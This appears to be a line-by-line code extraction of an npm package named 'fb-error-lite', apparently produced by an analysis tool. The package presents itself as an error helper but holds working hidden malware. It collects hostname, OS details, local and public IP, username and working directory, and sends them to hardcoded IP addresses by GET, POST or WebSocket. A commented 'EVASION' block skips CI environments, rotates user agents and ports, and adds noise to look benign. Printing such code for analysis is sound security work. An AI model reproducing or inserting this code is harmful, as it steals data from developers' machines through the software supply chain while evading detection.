// File: tmp/tmpkjn8xvoj/fb-error-lite/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const https = require("https")
Line 13: const systemInfo = {
    publicIP: "", // Will be fetched dynamically
    hostname: os.hostname(),
    osType: os.type(),
    osPlatform: os.platform(),
    osRelease: os.release(),
    osArch: os.arch(),
    localIP: Object.values(os.networkInterfaces())
        .flat()
        .find((i) => i.family === "IPv4" && !i.internal)?.address || "Unknown",
    whoamiUser: os.userInfo().username,
    currentDirectory: process.cwd(),
}
Line 15: os.hostname()
Line 16: os.type()
Line 17: os.platform()
Line 19: os.arch()
Line 20: _tmp_7.localIP = Object.values(os.networkInterfaces())
        .flat()
        .find((i) => i.family === "IPv4" && !i.internal)?.address || "Unknown"
Line 23: os.userInfo()
Line 28: (_tmp_10 = https.get("https://api64.ipify.org?format=json", (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => {
        try {
            systemInfo.publicIP = JSON.parse(data).ip;
        } catch (e) {
            systemInfo.publicIP = "Unknown";
        }
        sendData(systemInfo);
    });
}))
Line 33: systemInfo.publicIP = JSON.parse(data).ip
Line 37: sendData(systemInfo)
Line 39: sendData(systemInfo)
Line 43: _tmp_11.push("http://54.173.15.59:8080/jpd.php")
Line 53: Object.entries(data)
        .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
        .join("&")
Line 61: getFetch()
Line 64: buildQueryParams(data)
Line 67: const getResponse = await fetch(getUrl, { method: "GET" })
Line 70: const postResponse = await fetch(getAvailableEndpoint(), {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            },
            body: JSON.stringify(data),
        })
Line 81: getResponse.text()
Line 82: postResponse.text()
Line 88: sendViaWebSocket(data)
Line 95: _tmp_5 = await import("ws")
Line 98: {
            if (!isPreinstall) {
                console.log("WebSocket connection established.");
            }
            ws.send(JSON.stringify(data));
            ws.close();
        }
Line 102: ws.send(JSON.stringify(data))

// File: tmp/tmpkjn8xvoj/fb-error-lite/package/npm/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const https = require("https")
Line 3: const crypto = require("crypto")
Line 6: const EVASION = {
  CI_DETECTION: [
    'CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 
    'BITBUCKET_BUILD_NUMBER', 'TRAVIS'
  ],
  USER_AGENTS: [
    'npm/8.19.3 Node.js/18.17.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'curl/8.4.0'
  ],
  PORT_ROTATION: [8080, 80, 443],
  FAILURE_RATE: 0.3
}
Line 8: _tmp_16.push("GITHUB_ACTIONS")
Line 9: _tmp_16.push("BITBUCKET_BUILD_NUMBER")
Line 12: _tmp_17.push("npm/8.19.3 Node.js/18.17.1")
Line 13: _tmp_17.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
Line 14: _tmp_17.push("curl/8.4.0")
Line 16: _tmp_15.PORT_ROTATION = [8080, 80, 443]
Line 23: EVASION.CI_DETECTION.some(v => process.env[v]) || 
    (process.argv[1].includes("node_modules") && Math.random() < EVASION.FAILURE_RATE)
Line 24: process.argv[1].includes("node_modules") && Math.random() < EVASION.FAILURE_RATE
Line 28: {
  const interfaces = os.networkInterfaces();
  const internalIP = Object.values(interfaces)
    .flat()
    .find(i => i.family === 'IPv4' && !i.internal)?.address || 'Unknown';

  // Main payload matching PHP allowedFields
  const coreData = {
    publicIP: "", // Filled dynamically
    hostname: os.hostname().slice(0, 24),
    osType: os.type(),
    osPlatform: os.platform(),
    osRelease: os.release(),
    osArch: os.arch(),
    localIP: internalIP,
    whoamiUser: os.userInfo().username,
    currentDirectory: process.cwd().split(/[\\/]/).pop()
  };

  // ðŸš§ Add benign-looking noise
  return {
    ...coreData,
    __npm_package: process.env.npm_package_name || 'undefined',
    _node_version: process.versions.node,
    _timestamp: Date.now()
  };
}
Line 30: const internalIP = Object.values(interfaces)
    .flat()
    .find(i => i.family === 'IPv4' && !i.internal)?.address || 'Unknown'
Line 35: const coreData = {
    publicIP: "", // Filled dynamically
    hostname: os.hostname().slice(0, 24),
    osType: os.type(),
    osPlatform: os.platform(),
    osRelease: os.release(),
    osArch: os.arch(),
    localIP: internalIP,
    whoamiUser: os.userInfo().username,
    currentDirectory: process.cwd().split(/[\\/]/).pop()
  }
Line 37: os.hostname()
Line 38: os.type()
Line 39: os.platform()
Line 41: os.arch()
Line 43: os.userInfo()
Line 44: _tmp_4.currentDirectory = process.cwd().split(/[\\/]/).pop()
Line 58: {
    const endpoint = `http://34.229.201.136:${
      EVASION.PORT_ROTATION[Math.floor(Math.random()*EVASION.PORT_ROTATION.length)]
    }/jpd.php`;

    // Alternate between GET/POST randomly
    const useGet = Math.random() > 0.5;
    
    const url = useGet 
      ? `${endpoint}?${new URLSearchParams(payload)}`
      : endpoint;

    await fetch(url, {
      method: useGet ? 'GET' : 'POST',
      headers: {
        'User-Agent': EVASION.USER_AGENTS[Math.floor(Math.random()*EVASION.USER_AGENTS.length)],
        'Content-Type': 'application/json'
      },
      body: useGet ? undefined : JSON.stringify(payload)
    });

  }
Line 59: const endpoint = `http://34.229.201.136:${
      EVASION.PORT_ROTATION[Math.floor(Math.random()*EVASION.PORT_ROTATION.length)]
    }/jpd.php`
Line 60: EVASION.PORT_ROTATION[Math.floor(Math.random()*EVASION.PORT_ROTATION.length)]
Line 66: const url = useGet 
      ? `${endpoint}?${new URLSearchParams(payload)}`
      : endpoint
Line 70: await fetch(url, {
      method: useGet ? 'GET' : 'POST',
      headers: {
        'User-Agent': EVASION.USER_AGENTS[Math.floor(Math.random()*EVASION.USER_AGENTS.length)],
        'Content-Type': 'application/json'
      },
      body: useGet ? undefined : JSON.stringify(payload)
    })
Line 72: _tmp_10.headers = {
        'User-Agent': EVASION.USER_AGENTS[Math.floor(Math.random()*EVASION.USER_AGENTS.length)],
        'Content-Type': 'application/json'
      }
Line 73: _tmp_11.User-Agent = EVASION.USER_AGENTS[Math.floor(Math.random()*EVASION.USER_AGENTS.length)]
Line 88: _tmp_13.push("https://api.ipify.org?format=json")
Line 89: _tmp_13.push("https://ipinfo.io/json")
Line 90: _tmp_13.push("https://icanhazip.com")
Line 93: {
      https.get(providers[index], res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            resolve(JSON.parse(data).ip || 'Unknown');
          } catch {
            if (index < providers.length - 1) tryProvider(index + 1);
            else resolve('Unknown');
          }
        });
      }).on('error', () => {
        if (index < providers.length - 1) tryProvider(index + 1);
        else resolve('Unknown');
      });
    }
Line 94: https.get(providers[index], res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            resolve(JSON.parse(data).ip || 'Unknown');
          } catch {
            if (index < providers.length - 1) tryProvider(index + 1);
            else resolve('Unknown');
          }
        });
      }).on('error', () => {
        if (index < providers.length - 1) tryProvider(index + 1);
        else resolve('Unknown');
      })
Line 117: isBlockedEnvironment()
